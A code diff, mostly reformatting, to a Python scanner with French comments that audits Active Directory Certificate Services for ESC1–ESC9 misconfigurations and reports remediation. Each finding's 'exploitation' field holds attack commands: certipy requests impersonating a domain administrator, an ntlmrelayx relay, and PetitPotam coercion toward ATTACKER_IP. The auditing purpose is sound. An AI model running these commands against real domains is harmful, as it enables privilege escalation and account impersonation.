@@ -1,5 +1,4 @@
-"""
-ADCS Scanner — détection des vulnérabilités Active Directory Certificate Services.
+"""ADCS Scanner — détection des vulnérabilités Active Directory Certificate Services.
 
 Détecte les certifications ADCS mal configurées selon les techniques ESC1-ESC13 :
 - ESC1: Template avec enrollee supplies subject + Client Authentication EKU
@@ -28,7 +27,7 @@ Usage:
 
 from dataclasses import dataclass, field
 from enum import StrEnum
-from typing import Optional, Any
+
 import structlog
 
 logger = structlog.get_logger(__name__)
@@ -36,23 +35,25 @@ logger = structlog.get_logger(__name__)
 
 # ── Types ──────────────────────────────────────────────────────
 
+
 class ESCSeverity(StrEnum):
-    CRITICAL = "critical"   # Escalade domaine directe
-    HIGH = "high"           # Escalade probable
-    MEDIUM = "medium"       # Surface d'attaque
-    LOW = "low"             # Information
+    CRITICAL = "critical"  # Escalade domaine directe
+    HIGH = "high"  # Escalade probable
+    MEDIUM = "medium"  # Surface d'attaque
+    LOW = "low"  # Information
 
 
 @dataclass
 class ADCSFinding:
     """Une vulnérabilité ADCS détectée."""
-    esc_id: str                  # ESC1, ESC2...
+
+    esc_id: str  # ESC1, ESC2...
     title: str
     description: str
     severity: ESCSeverity
     affected_templates: list[str] = field(default_factory=list)
     affected_cas: list[str] = field(default_factory=list)
-    exploitation: str = ""        # Comment exploiter
+    exploitation: str = ""  # Comment exploiter
     remediation: str = ""
     references: list[str] = field(default_factory=list)
 
@@ -60,10 +61,11 @@ class ADCSFinding:
 @dataclass
 class TemplateInfo:
     """Informations sur un certificate template."""
+
     name: str
     dn: str
     display_name: str = ""
-    oid: str = ""                          # Template OID
+    oid: str = ""  # Template OID
     schema_version: int = 1
     # Flags
     enrollee_supplies_subject: bool = False  # ESC1
@@ -72,11 +74,11 @@ class TemplateInfo:
     # EKU
     ekus: list[str] = field(default_factory=list)  # "1.3.6.1.5.5.7.3.1", etc.
     has_client_auth_eku: bool = False
-    has_any_purpose_eku: bool = False      # ESC2
+    has_any_purpose_eku: bool = False  # ESC2
     has_cert_request_agent_eku: bool = False  # ESC3
     has_enrollment_agent_eku: bool = False
     # Security
-    no_security_extension: bool = False    # ESC9
+    no_security_extension: bool = False  # ESC9
     # Permissions
     enroll_permissions: list[str] = field(default_factory=list)
     autoenroll_permissions: list[str] = field(default_factory=list)
@@ -90,6 +92,7 @@ class TemplateInfo:
 @dataclass
 class CAInfo:
     """Informations sur une Certificate Authority."""
+
     name: str
     dn: str
     dns_hostname: str = ""
@@ -97,19 +100,20 @@ class CAInfo:
     # Flags CA
     editf_attributesubjectaltname2: bool = False  # ESC6
     # Permissions
-    manage_ca_permissions: list[str] = field(default_factory=list)     # ESC7
+    manage_ca_permissions: list[str] = field(default_factory=list)  # ESC7
     manage_certificates_permissions: list[str] = field(default_factory=list)  # ESC7
     enroll_permissions: list[str] = field(default_factory=list)
     # Web enrollment (ESC8)
     web_enrollment_enabled: bool = False
     web_enrollment_url: str = ""
     # Security
-    sanitized_name: str = ""   # Nom sans les caractères de contrôle
+    sanitized_name: str = ""  # Nom sans les caractères de contrôle
 
 
 @dataclass
 class ADCSReport:
     """Rapport de scan ADCS complet."""
+
     domain: str
     cas: list[CAInfo] = field(default_factory=list)
     templates: list[TemplateInfo] = field(default_factory=list)
@@ -137,16 +141,17 @@ class ADCSReport:
 # ── Constantes ─────────────────────────────────────────────────
 
 # OIDs EKU (Extended Key Usage)
-CLIENT_AUTHENTICATION_OID="1.3.6.1.5.5.7.3.2"
-SERVER_AUTHENTICATION_OID="1.3.6.1.5.5.7.3.1"
+CLIENT_AUTHENTICATION_OID = "1.3.6.1.5.5.7.3.2"
+SERVER_AUTHENTICATION_OID = "1.3.6.1.5.5.7.3.1"
 CODE_SIGNING_OID = "1.3.6.1.5.5.7.3.3"
-SMARTCARD_LOGON_OID="1.3.6.1.5.5.7.3.20"  # ESC1 target
-ANY_PURPOSE_OID = "2.5.29.37.0"             # ESC2
-CERT_REQUEST_AGENT_OID="1.3.6.1.4.1.311.20.2.1"   # ESC3
-ENROLLMENT_AGENT_OID = "1.3.6.1.4.1.311.20.2.1"   # ESC3
+SMARTCARD_LOGON_OID = "1.3.6.1.5.5.7.3.20"  # ESC1 target
+ANY_PURPOSE_OID = "2.5.29.37.0"  # ESC2
+CERT_REQUEST_AGENT_OID = "1.3.6.1.4.1.311.20.2.1"  # ESC3
+ENROLLMENT_AGENT_OID = "1.3.6.1.4.1.311.20.2.1"  # ESC3
 
 
 # ── Scanner ────────────────────────────────────────────────────
+
 
 class ADCSSCanner:
     """Scanner de vulnérabilités ADCS.
@@ -160,7 +165,7 @@ class ADCSSCanner:
             print(f"ESC{f.esc_id}: {f.title}")
     """
 
-    def __init__(self, connector=None):
+    def __init__(self, connector=None) -> None:
         self.connector = connector
 
     async def scan_all(self, domain_map) -> ADCSReport:
@@ -171,12 +176,14 @@ class ADCSSCanner:
 
         Returns:
             ADCSReport structuré
+
         """
         report = ADCSReport(domain=domain_map.domain.name)
 
         if not self.connector or not self.connector.is_connected:
-            report.errors.append("No active AD connector — "
-                                 "ADCS scan requires authenticated LDAP access")
+            report.errors.append(
+                "No active AD connector — ADCS scan requires authenticated LDAP access",
+            )
             return report
 
         logger.info("adcs_scan_starting", domain=domain_map.domain.name)
@@ -186,14 +193,14 @@ class ADCSSCanner:
             report.cas = await self._enumerate_cas()
         except Exception as e:
             report.errors.append(f"CA enumeration failed: {e}")
-            logger.error("adcs_ca_enum_failed", error=str(e))
+            logger.exception("adcs_ca_enum_failed", error=str(e))
 
         # ── Énumérer les templates ─────────────────────────────
         try:
             report.templates = await self._enumerate_templates()
         except Exception as e:
             report.errors.append(f"Template enumeration failed: {e}")
-            logger.error("adcs_template_enum_failed", error=str(e))
+            logger.exception("adcs_template_enum_failed", error=str(e))
 
         # ── Analyser les vulnérabilités ────────────────────────
         self._check_esc1(report)
@@ -206,10 +213,12 @@ class ADCSSCanner:
         self._check_esc8(report)
         self._check_esc9(report)
 
-        logger.info("adcs_scan_complete",
-                    cas=len(report.cas),
-                    templates=len(report.templates),
-                    findings=len(report.findings))
+        logger.info(
+            "adcs_scan_complete",
+            cas=len(report.cas),
+            templates=len(report.templates),
+            findings=len(report.findings),
+        )
 
         return report
 
@@ -222,10 +231,9 @@ class ADCSSCanner:
         entries = await self.connector.search(
             "(objectClass=pKIEnrollmentService)",
             search_base=f"CN=Enrollment Services,"
-                        f"CN=Public Key Services,CN=Services,"
-                        f"{self.connector.config.effective_base_dn}",
-            attributes=["cn", "dNSHostName", "cACertificate",
-                        "certificateTemplates"],
+            f"CN=Public Key Services,CN=Services,"
+            f"{self.connector.config.effective_base_dn}",
+            attributes=["cn", "dNSHostName", "cACertificate", "certificateTemplates"],
         )
 
         for entry in entries:
@@ -243,8 +251,8 @@ class ADCSSCanner:
                 config_entries = await self.connector.search(
                     f"(cn={ca.name})",
                     search_base=f"CN=Certification Authorities,"
-                                f"CN=Public Key Services,CN=Services,"
-                                f"{self.connector.config.effective_base_dn}",
+                    f"CN=Public Key Services,CN=Services,"
+                    f"{self.connector.config.effective_base_dn}",
                     attributes=["flags", "cACertificateDN"],
                     max_entries=1,
                 )
@@ -261,18 +269,18 @@ class ADCSSCanner:
                 # En production, utiliser les ACLs AD complètes.
                 # Ici on vérifie via une heuristique basée sur les groupes connus.
                 ca.manage_ca_permissions = await self._check_ca_permission(
-                    ca.config_dn, "ManageCA"
+                    ca.config_dn,
+                    "ManageCA",
                 )
                 ca.manage_certificates_permissions = await self._check_ca_permission(
-                    ca.config_dn, "ManageCertificates"
+                    ca.config_dn,
+                    "ManageCertificates",
                 )
 
                 # Web enrollment (ESC8)
                 if ca.dns_hostname:
                     ca.web_enrollment_enabled = True
-                    ca.web_enrollment_url = (
-                        f"http://{ca.dns_hostname}/certsrv/"
-                    )
+                    ca.web_enrollment_url = f"http://{ca.dns_hostname}/certsrv/"
 
             except Exception as e:
                 logger.debug("ca_enrich_failed", ca=ca.name, error=str(e))
@@ -286,10 +294,12 @@ class ADCSSCanner:
         entries = await self.connector.search(
             "(objectClass=pKICertificateTemplate)",
             search_base=f"CN=Certificate Templates,"
-                        f"CN=Public Key Services,CN=Services,"
-                        f"{self.connector.config.effective_base_dn}",
+            f"CN=Public Key Services,CN=Services,"
+            f"{self.connector.config.effective_base_dn}",
             attributes=[
-                "cn", "displayName", "msPKI-Cert-Template-OID",
+                "cn",
+                "displayName",
+                "msPKI-Cert-Template-OID",
                 "msPKI-Template-Schema-Version",
                 "msPKI-Enrollment-Flag",
                 "msPKI-Certificate-Name-Flag",
@@ -328,9 +338,7 @@ class ADCSSCanner:
             has_any_purpose = ANY_PURPOSE_OID in ekus
             has_client_auth = CLIENT_AUTHENTICATION_OID in ekus
             has_cra = CERT_REQUEST_AGENT_OID in ekus
-            has_enrollment_agent = any(
-                "1.3.6.1.4.1.311.20.2.1" in eku for eku in ekus
-            )
+            has_enrollment_agent = any("1.3.6.1.4.1.311.20.2.1" in eku for eku in ekus)
 
             # ESC9: no security extension = no CT_FLAG_ENFORCE... flag
             # msPKI-Enrollment-Flag & 0x00000100 = CT_FLAG_NO_SECURITY_EXTENSION
@@ -342,7 +350,7 @@ class ADCSSCanner:
                 display_name=str(attrs.get("displayName", [""])[0] or ""),
                 oid=str(attrs.get("msPKI-Cert-Template-OID", [""])[0] or ""),
                 schema_version=int(
-                    attrs.get("msPKI-Template-Schema-Version", [1])[0] or 1
+                    attrs.get("msPKI-Template-Schema-Version", [1])[0] or 1,
                 ),
                 enrollee_supplies_subject=enrollee_supplies_subject,
                 requires_manager_approval=bool(enroll_flag & 0x00000002),
@@ -359,7 +367,9 @@ class ADCSSCanner:
         return templates
 
     async def _check_ca_permission(
-        self, ca_dn: str, permission: str
+        self,
+        ca_dn: str,
+        permission: str,
     ) -> list[str]:
         """Vérifie les permissions sur une CA (simplifié).
 
@@ -387,36 +397,41 @@ class ADCSSCanner:
                 continue
             if t.requires_manager_approval:
                 continue
-            if t.has_client_auth_eku or t.has_any_purpose_eku or \
-               any("Smartcard" in eku or "Smart Card" in eku for eku in t.ekus):
+            if (
+                t.has_client_auth_eku
+                or t.has_any_purpose_eku
+                or any("Smartcard" in eku or "Smart Card" in eku for eku in t.ekus)
+            ):
                 vulnerable.append(t.name)
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC1",
-                title="Template vulnérable — Enrollee supplies subject + Client Auth EKU",
-                description=(
-                    f"{len(vulnerable)} template(s) permettent à l'enrolleur "
-                    f"de spécifier le sujet (SAN) et ont un EKU d'authentification : "
-                    f"un attaquant peut demander un certificat pour n'importe quel "
-                    f"utilisateur (y compris Domain Admin)."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC1",
+                    title="Template vulnérable — Enrollee supplies subject + Client Auth EKU",
+                    description=(
+                        f"{len(vulnerable)} template(s) permettent à l'enrolleur "
+                        f"de spécifier le sujet (SAN) et ont un EKU d'authentification : "
+                        f"un attaquant peut demander un certificat pour n'importe quel "
+                        f"utilisateur (y compris Domain Admin)."
+                    ),
+                    severity=ESCSeverity.CRITICAL,
+                    affected_templates=vulnerable,
+                    exploitation=(
+                        f"certipy-ad req -u 'user' -p 'pass' -dc-ip DC "
+                        f"-ca 'CA_NAME' -template '{vulnerable[0]}' "
+                        f"-upn 'administrator@domain'"
+                    ),
+                    remediation=(
+                        "1. Supprimer le flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\n"
+                        "2. OU exiger l'approbation du manager\n"
+                        "3. OU restreindre les permissions d'enrôlement"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.CRITICAL,
-                affected_templates=vulnerable,
-                exploitation=(
-                    f"certipy-ad req -u 'user' -p 'pass' -dc-ip DC "
-                    f"-ca 'CA_NAME' -template '{vulnerable[0]}' "
-                    f"-upn 'administrator@domain'"
-                ),
-                remediation=(
-                    "1. Supprimer le flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\n"
-                    "2. OU exiger l'approbation du manager\n"
-                    "3. OU restreindre les permissions d'enrôlement"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc2(self, report: ADCSReport) -> None:
         """ESC2: Template with Any Purpose EKU or no EKU.
@@ -432,29 +447,31 @@ class ADCSSCanner:
                     vulnerable.append(t.name)
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC2",
-                title="Template avec Any Purpose EKU ou sans EKU",
-                description=(
-                    f"{len(vulnerable)} template(s) avec EKU 'Any Purpose' "
-                    f"ou sans restriction EKU — le certificat peut être "
-                    f"utilisé pour n'importe quel usage, incluant "
-                    f"l'authentification client."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC2",
+                    title="Template avec Any Purpose EKU ou sans EKU",
+                    description=(
+                        f"{len(vulnerable)} template(s) avec EKU 'Any Purpose' "
+                        f"ou sans restriction EKU — le certificat peut être "
+                        f"utilisé pour n'importe quel usage, incluant "
+                        f"l'authentification client."
+                    ),
+                    severity=ESCSeverity.CRITICAL,
+                    affected_templates=vulnerable,
+                    exploitation=(
+                        f"certipy-ad req -u 'user' -p 'pass' "
+                        f"-template '{vulnerable[0]}' -ca 'CA_NAME'"
+                    ),
+                    remediation=(
+                        "1. Définir des EKUs spécifiques sur le template\n"
+                        "2. Ne PAS utiliser Any Purpose sauf absolument nécessaire"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.CRITICAL,
-                affected_templates=vulnerable,
-                exploitation=(
-                    f"certipy-ad req -u 'user' -p 'pass' "
-                    f"-template '{vulnerable[0]}' -ca 'CA_NAME'"
-                ),
-                remediation=(
-                    "1. Définir des EKUs spécifiques sur le template\n"
-                    "2. Ne PAS utiliser Any Purpose sauf absolument nécessaire"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc3(self, report: ADCSReport) -> None:
         """ESC3: Enrollment Agent + Certificate Request Agent.
@@ -466,43 +483,41 @@ class ADCSSCanner:
         4. Peut ensuite demander un certificat ESC3b pour n'importe quel user
         """
         enrollment_agent_templates = [
-            t.name for t in report.templates
-            if t.has_enrollment_agent_eku
+            t.name for t in report.templates if t.has_enrollment_agent_eku
         ]
-        request_agent_templates = [
-            t.name for t in report.templates
-            if t.has_cert_request_agent_eku
-        ]
+        request_agent_templates = [t.name for t in report.templates if t.has_cert_request_agent_eku]
 
         if enrollment_agent_templates and request_agent_templates:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC3",
-                title="Enrollment Agent + Certificate Request Agent exploitables",
-                description=(
-                    f"Templates Enrollment Agent ({len(enrollment_agent_templates)}) "
-                    f"et Certificate Request Agent ({len(request_agent_templates)}) "
-                    f"présents : un attaquant peut s'enrôler comme agent et "
-                    f"demander des certificats pour d'autres utilisateurs."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC3",
+                    title="Enrollment Agent + Certificate Request Agent exploitables",
+                    description=(
+                        f"Templates Enrollment Agent ({len(enrollment_agent_templates)}) "
+                        f"et Certificate Request Agent ({len(request_agent_templates)}) "
+                        f"présents : un attaquant peut s'enrôler comme agent et "
+                        f"demander des certificats pour d'autres utilisateurs."
+                    ),
+                    severity=ESCSeverity.HIGH,
+                    affected_templates=enrollment_agent_templates + request_agent_templates,
+                    exploitation=(
+                        f"# Étape 1: Enrôler comme agent\n"
+                        f"certipy-ad req -template '"
+                        f"{enrollment_agent_templates[0]}' -ca 'CA_NAME'\n"
+                        f"# Étape 2: Demander certificat pour admin\n"
+                        f"certipy-ad req -template '"
+                        f"{request_agent_templates[0]}' -on-behalf-of 'DOMAIN\\\\admin'"
+                    ),
+                    remediation=(
+                        "1. Supprimer le template Enrollment Agent si non nécessaire\n"
+                        "2. Restreindre les permissions d'enrôlement\n"
+                        "3. Exiger des signatures d'autorisation (RA signatures > 0)"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.HIGH,
-                affected_templates=enrollment_agent_templates + request_agent_templates,
-                exploitation=(
-                    f"# Étape 1: Enrôler comme agent\n"
-                    f"certipy-ad req -template '"
-                    f"{enrollment_agent_templates[0]}' -ca 'CA_NAME'\n"
-                    f"# Étape 2: Demander certificat pour admin\n"
-                    f"certipy-ad req -template '"
-                    f"{request_agent_templates[0]}' -on-behalf-of 'DOMAIN\\\\admin'"
-                ),
-                remediation=(
-                    "1. Supprimer le template Enrollment Agent si non nécessaire\n"
-                    "2. Restreindre les permissions d'enrôlement\n"
-                    "3. Exiger des signatures d'autorisation (RA signatures > 0)"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc4(self, report: ADCSReport) -> None:
         """ESC4: ACLs faibles sur les templates.
@@ -517,30 +532,32 @@ class ADCSSCanner:
                 vulnerable.append(t.name)
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC4",
-                title="Permissions faibles sur les templates",
-                description=(
-                    f"{len(vulnerable)} template(s) avec des permissions "
-                    f"d'écriture pour des utilisateurs non-privilégiés. "
-                    f"Un attaquant peut modifier le template pour activer "
-                    f"les vulnérabilités ESC1-3."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC4",
+                    title="Permissions faibles sur les templates",
+                    description=(
+                        f"{len(vulnerable)} template(s) avec des permissions "
+                        f"d'écriture pour des utilisateurs non-privilégiés. "
+                        f"Un attaquant peut modifier le template pour activer "
+                        f"les vulnérabilités ESC1-3."
+                    ),
+                    severity=ESCSeverity.HIGH,
+                    affected_templates=vulnerable,
+                    exploitation=(
+                        "Modifier le template pour ajouter "
+                        "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU"
+                    ),
+                    remediation=(
+                        "1. Auditer les ACLs des templates\n"
+                        "2. Retirer les droits d'écriture aux utilisateurs non-admin\n"
+                        "3. Activer l'audit des modifications de templates"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.HIGH,
-                affected_templates=vulnerable,
-                exploitation=(
-                    "Modifier le template pour ajouter "
-                    "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU"
-                ),
-                remediation=(
-                    "1. Auditer les ACLs des templates\n"
-                    "2. Retirer les droits d'écriture aux utilisateurs non-admin\n"
-                    "3. Activer l'audit des modifications de templates"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc5(self, report: ADCSReport) -> None:
         """ESC5: Objets PKI non sécurisés.
@@ -552,25 +569,27 @@ class ADCSSCanner:
         # Vérification heuristique basée sur le nombre de CAs
         for ca in report.cas:
             if not ca.config_dn:
-                report.findings.append(ADCSFinding(
-                    esc_id="ESC5",
-                    title=f"CA {ca.name} — configuration PKI potentiellement non sécurisée",
-                    description=(
-                        f"La CA {ca.name} n'a pas de DN de configuration "
-                        f"accessible : les ACLs PKI n'ont pas pu être vérifiées."
+                report.findings.append(
+                    ADCSFinding(
+                        esc_id="ESC5",
+                        title=f"CA {ca.name} — configuration PKI potentiellement non sécurisée",
+                        description=(
+                            f"La CA {ca.name} n'a pas de DN de configuration "
+                            f"accessible : les ACLs PKI n'ont pas pu être vérifiées."
+                        ),
+                        severity=ESCSeverity.MEDIUM,
+                        affected_cas=[ca.name],
+                        remediation=(
+                            "1. Vérifier les ACLs sur les objets PKI :\n"
+                            "   - CN=Public Key Services,CN=Services,CN=Configuration,DC=...\n"
+                            "   - Objets CA, NTAuthCertificates, AIA, CDP\n"
+                            "2. Restreindre au strict minimum"
+                        ),
+                        references=[
+                            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                        ],
                     ),
-                    severity=ESCSeverity.MEDIUM,
-                    affected_cas=[ca.name],
-                    remediation=(
-                        "1. Vérifier les ACLs sur les objets PKI :\n"
-                        "   - CN=Public Key Services,CN=Services,CN=Configuration,DC=...\n"
-                        "   - Objets CA, NTAuthCertificates, AIA, CDP\n"
-                        "2. Restreindre au strict minimum"
-                    ),
-                    references=[
-                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                    ],
-                ))
+                )
 
     def _check_esc6(self, report: ADCSReport) -> None:
         """ESC6: CA avec flag EDITF_ATTRIBUTESUBJECTALTNAME2.
@@ -585,31 +604,33 @@ class ADCSSCanner:
                 vulnerable.append(ca.name)
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC6",
-                title="CA avec EDITF_ATTRIBUTESUBJECTALTNAME2 activé",
-                description=(
-                    f"{len(vulnerable)} CA(s) avec le flag "
-                    f"EDITF_ATTRIBUTESUBJECTALTNAME2 : n'importe quel "
-                    f"utilisateur peut spécifier un Subject Alternative Name "
-                    f"dans ses requêtes de certificat → impersonation."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC6",
+                    title="CA avec EDITF_ATTRIBUTESUBJECTALTNAME2 activé",
+                    description=(
+                        f"{len(vulnerable)} CA(s) avec le flag "
+                        f"EDITF_ATTRIBUTESUBJECTALTNAME2 : n'importe quel "
+                        f"utilisateur peut spécifier un Subject Alternative Name "
+                        f"dans ses requêtes de certificat → impersonation."
+                    ),
+                    severity=ESCSeverity.CRITICAL,
+                    affected_cas=vulnerable,
+                    exploitation=(
+                        f"certipy-ad req -u 'user' -p 'pass' "
+                        f"-ca '{vulnerable[0]}' -template 'User' "
+                        f"-upn 'administrator@domain'"
+                    ),
+                    remediation=(
+                        "Désactiver le flag : "
+                        "certutil -setreg Policy\\EditFlags "
+                        "-EDITF_ATTRIBUTESUBJECTALTNAME2"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.CRITICAL,
-                affected_cas=vulnerable,
-                exploitation=(
-                    f"certipy-ad req -u 'user' -p 'pass' "
-                    f"-ca '{vulnerable[0]}' -template 'User' "
-                    f"-upn 'administrator@domain'"
-                ),
-                remediation=(
-                    "Désactiver le flag : "
-                    "certutil -setreg Policy\\EditFlags "
-                    "-EDITF_ATTRIBUTESUBJECTALTNAME2"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc7(self, report: ADCSReport) -> None:
         """ESC7: Permissions CA faibles (ManageCA, ManageCertificates).
@@ -627,30 +648,32 @@ class ADCSSCanner:
                 vulnerable.append(f"{ca.name} (ManageCertificates)")
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC7",
-                title="Permissions CA excessives",
-                description=(
-                    f"Permissions ManageCA/ManageCertificates détectées "
-                    f"sur {len(vulnerable)} CA(s). Un attaquant peut modifier "
-                    f"la configuration de la CA ou émettre des certificats "
-                    f"arbitraires."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC7",
+                    title="Permissions CA excessives",
+                    description=(
+                        f"Permissions ManageCA/ManageCertificates détectées "
+                        f"sur {len(vulnerable)} CA(s). Un attaquant peut modifier "
+                        f"la configuration de la CA ou émettre des certificats "
+                        f"arbitraires."
+                    ),
+                    severity=ESCSeverity.CRITICAL,
+                    affected_cas=vulnerable,
+                    exploitation=(
+                        "# ManageCA: activer ESC6 puis exploiter\n"
+                        "# ManageCertificates: émettre un certificat pour admin"
+                    ),
+                    remediation=(
+                        "1. Retirer ManageCA des utilisateurs non-admin\n"
+                        "2. Retirer ManageCertificates des utilisateurs non-admin\n"
+                        "3. Restreindre au groupe 'Cert Publishers' minimum"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.CRITICAL,
-                affected_cas=vulnerable,
-                exploitation=(
-                    "# ManageCA: activer ESC6 puis exploiter\n"
-                    "# ManageCertificates: émettre un certificat pour admin"
-                ),
-                remediation=(
-                    "1. Retirer ManageCA des utilisateurs non-admin\n"
-                    "2. Retirer ManageCertificates des utilisateurs non-admin\n"
-                    "3. Restreindre au groupe 'Cert Publishers' minimum"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc8(self, report: ADCSReport) -> None:
         """ESC8: NTLM relay vers HTTP enrollment endpoints.
@@ -666,32 +689,34 @@ class ADCSSCanner:
                     vulnerable.append(f"{ca.name} ({ca.web_enrollment_url})")
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC8",
-                title="Web enrollment HTTP — vulnérable au NTLM relay",
-                description=(
-                    f"{len(vulnerable)} CA(s) avec web enrollment en HTTP : "
-                    f"un attaquant peut faire du NTLM relay depuis un serveur "
-                    f"SMB/HTTP malveillant pour obtenir un certificat."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC8",
+                    title="Web enrollment HTTP — vulnérable au NTLM relay",
+                    description=(
+                        f"{len(vulnerable)} CA(s) avec web enrollment en HTTP : "
+                        f"un attaquant peut faire du NTLM relay depuis un serveur "
+                        f"SMB/HTTP malveillant pour obtenir un certificat."
+                    ),
+                    severity=ESCSeverity.HIGH,
+                    affected_cas=vulnerable,
+                    exploitation=(
+                        "# 1. Configurer le relay NTLM\n"
+                        "ntlmrelayx -t http://CA/certsrv/certfnsh.asp "
+                        "-smb2support --adcs --template 'User'\n"
+                        "# 2. Forcer l'authentification (PetitPotam, coerced auth...)\n"
+                        "python3 PetitPotam.py -d DOMAIN ATTACKER_IP DC_IP"
+                    ),
+                    remediation=(
+                        "1. Activer HTTPS sur le web enrollment\n"
+                        "2. OU désactiver le web enrollment si non utilisé\n"
+                        "3. Activer EPA (Extended Protection for Authentication)"
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.HIGH,
-                affected_cas=vulnerable,
-                exploitation=(
-                    "# 1. Configurer le relay NTLM\n"
-                    "ntlmrelayx -t http://CA/certsrv/certfnsh.asp "
-                    "-smb2support --adcs --template 'User'\n"
-                    "# 2. Forcer l'authentification (PetitPotam, coerced auth...)\n"
-                    "python3 PetitPotam.py -d DOMAIN ATTACKER_IP DC_IP"
-                ),
-                remediation=(
-                    "1. Activer HTTPS sur le web enrollment\n"
-                    "2. OU désactiver le web enrollment si non utilisé\n"
-                    "3. Activer EPA (Extended Protection for Authentication)"
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
     def _check_esc9(self, report: ADCSReport) -> None:
         """ESC9: Absence d'extension de sécurité (CT_FLAG_NO_SECURITY_EXTENSION).
@@ -707,27 +732,30 @@ class ADCSSCanner:
                 vulnerable.append(t.name)
 
         if vulnerable:
-            report.findings.append(ADCSFinding(
-                esc_id="ESC9",
-                title="Absence d'extension de sécurité (CT_FLAG_NO_SECURITY_EXTENSION)",
-                description=(
-                    f"{len(vulnerable)} template(s) sans extension de sécurité : "
-                    f"le certificat ne contient pas le SID de l'enrolleur, "
-                    f"facilitant l'impersonation silencieuse."
+            report.findings.append(
+                ADCSFinding(
+                    esc_id="ESC9",
+                    title="Absence d'extension de sécurité (CT_FLAG_NO_SECURITY_EXTENSION)",
+                    description=(
+                        f"{len(vulnerable)} template(s) sans extension de sécurité : "
+                        f"le certificat ne contient pas le SID de l'enrolleur, "
+                        f"facilitant l'impersonation silencieuse."
+                    ),
+                    severity=ESCSeverity.MEDIUM,
+                    affected_templates=vulnerable,
+                    remediation=(
+                        "Désactiver CT_FLAG_NO_SECURITY_EXTENSION sur les templates. "
+                        "Re-publier les certificats existants."
+                    ),
+                    references=[
+                        "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
+                    ],
                 ),
-                severity=ESCSeverity.MEDIUM,
-                affected_templates=vulnerable,
-                remediation=(
-                    "Désactiver CT_FLAG_NO_SECURITY_EXTENSION sur les templates. "
-                    "Re-publier les certificats existants."
-                ),
-                references=[
-                    "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
-                ],
-            ))
+            )
 
 
 # ── Fonction utilitaire ────────────────────────────────────────
+
 
 async def quick_adcs_scan(domain_map, connector=None) -> ADCSReport:
     """Scan ADCS rapide.
